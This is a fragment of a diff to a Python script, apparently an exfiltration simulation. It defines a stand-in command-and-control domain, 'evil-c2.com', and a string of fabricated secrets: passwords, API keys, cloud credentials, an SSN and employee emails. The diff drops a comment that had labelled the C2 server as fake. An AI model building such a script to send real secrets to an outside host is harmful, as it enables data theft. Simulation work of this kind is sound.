@@ -3,9 +3,8 @@ import base64
 import time
 import random
 
-# Attacker ka C2 server (fake)
-C2_DOMAIN = "evil-c2.com"
 
+C2_DOMAIN = "evil-c2.com"
 
 SENSITIVE_DATA = "username=admin&password=SuperSecret123&creditcard=4111111111111111&ssn=123-45-6789&internal_api_key=sk-prod-abc123xyz789&db_password=Pr0d@DB#2026&aws_secret=wJalrXUtnFEMI/K7MDENG&employee_records=raj.sharma@helix.com,priya.mehta@helix.com,amit.verdi@helix.com"
 
